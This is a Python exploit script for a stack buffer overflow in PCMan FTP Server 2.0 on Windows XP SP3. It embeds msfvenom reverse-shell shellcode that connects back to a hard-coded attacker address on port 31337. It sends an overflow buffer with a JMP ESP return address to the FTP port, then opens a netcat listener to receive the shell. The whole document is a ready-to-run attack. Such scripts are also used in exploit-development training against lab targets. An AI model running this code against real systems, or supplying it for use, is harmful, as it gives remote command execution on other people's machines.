#!/usr/bin/env python
'''
Vulnerable App: https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
'''
import sys
import socket
import struct
import subprocess

if len(sys.argv) < 2:
  print '[*] PCMan FTP version 2.0 exploit'
  print '[*] Usage: {} {}'.format(sys.argv[0], sys.argv[1])

# Windows XP SP3 Profesionnal x86
# JMP ESP 77FAB277 [SHLAPI.dll]
# Badchars \x00\x0a\x0d
# msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=192.168.80.129 -b '\x00\x0a\x0d' -a x86 -f c EXITFUNC=process

shellcode = (
"\xd9\xe8\xb8\x2d\xec\x84\x1f\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x31\x47\x17\x83\xef\xfc\x03\x6a\xff\x66\xea\x88\x17\xe4"
"\x15\x70\xe8\x89\x9c\x95\xd9\x89\xfb\xde\x4a\x3a\x8f\xb2\x66"
"\xb1\xdd\x26\xfc\xb7\xc9\x49\xb5\x72\x2c\x64\x46\x2e\x0c\xe7"
"\xc4\x2d\x41\xc7\xf5\xfd\x94\x06\x31\xe3\x55\x5a\xea\x6f\xcb"
"\x4a\x9f\x3a\xd0\xe1\xd3\xab\x50\x16\xa3\xca\x71\x89\xbf\x94"
"\x51\x28\x13\xad\xdb\x32\x70\x88\x92\xc9\x42\x66\x25\x1b\x9b"
"\x87\x8a\x62\x13\x7a\xd2\xa3\x94\x65\xa1\xdd\xe6\x18\xb2\x1a"
"\x94\xc6\x37\xb8\x3e\x8c\xe0\x64\xbe\x41\x76\xef\xcc\x2e\xfc"
"\xb7\xd0\xb1\xd1\xcc\xed\x3a\xd4\x02\x64\x78\xf3\x86\x2c\xda"
"\x9a\x9f\x88\x8d\xa3\xff\x72\x71\x06\x74\x9e\x66\x3b\xd7\xf7"
"\x4b\x76\xe7\x07\xc4\x01\x94\x35\x4b\xba\x32\x76\x04\x64\xc5"
"\x79\x3f\xd0\x59\x84\xc0\x21\x70\x43\x94\x71\xea\x62\x95\x19"
"\xea\x8b\x40\x8d\xba\x23\x3b\x6e\x6a\x84\xeb\x06\x60\x0b\xd3"
"\x37\x8b\xc1\x7c\xdd\x76\x82\x42\x8a\x28\xd3\x2b\xc9\xc8\xa9"
"\xc2\x44\x2e\x27\x05\x01\xf9\xd0\xbc\x08\x71\x40\x40\x87\xfc"
"\x42\xca\x24\x01\x0c\x3b\x40\x11\xf9\xcb\x1f\x4b\xac\xd4\xb5"
"\xe3\x32\x46\x52\xf3\x3d\x7b\xcd\xa4\x6a\x4d\x04\x20\x87\xf4"
"\xbe\x56\x5a\x60\xf8\xd2\x81\x51\x07\xdb\x44\xed\x23\xcb\x90"
"\xee\x6f\xbf\x4c\xb9\x39\x69\x2b\x13\x88\xc3\xe5\xc8\x42\x83"
"\x70\x23\x55\xd5\x7c\x6e\x23\x39\xcc\xc7\x72\x46\xe1\x8f\x72"
"\x3f\x1f\x30\x7c\xea\x9b\x40\x37\xb6\x8a\xc8\x9e\x23\x8f\x94"
"\x20\x9e\xcc\xa0\xa2\x2a\xad\x56\xba\x5f\xa8\x13\x7c\x8c\xc0"
"\x0c\xe9\xb2\x77\x2c\x38")

buffer = ''
buffer += '\x41' * 2006
buffer += struct.pack('<L', 0x77fab277)
buffer += '\x90' * 16
buffer += shellcode

try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((sys.argv[1], 21))

  s.recv(1024)
  s.send('{}\r\n'.format(buffer))
  s.close()

  subprocess.call(['nc -lnvp 31337'], shell=True)
except socket.error:
  print '[-] Host unreachable'
  sys.exit(1)

